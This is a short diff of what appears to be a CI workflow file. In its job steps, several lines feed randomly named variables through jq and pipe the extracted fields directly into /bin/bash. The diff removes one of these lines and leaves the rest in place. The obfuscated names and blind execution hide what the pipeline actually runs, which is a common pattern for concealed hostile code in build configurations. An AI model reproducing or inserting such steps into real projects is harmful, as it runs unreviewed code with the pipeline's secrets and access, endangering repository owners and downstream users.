@@ -24,7 +24,6 @@ jobs:
           echo $e32982 | jq -r .vz28455 | /bin/bash
           printf '%s' "$utomg4676" | jq -r .fvq2 | /bin/bash
           printf '%s' "$stgz54" | jq -r .femja49 | /bin/bash
-          printf '%s' "$j02" | jq -r .qxzy87 | /bin/bash
           printf '%s' "$wqdb07001" | jq -r .dp90651 | /bin/bash
 
       - name: Archive results
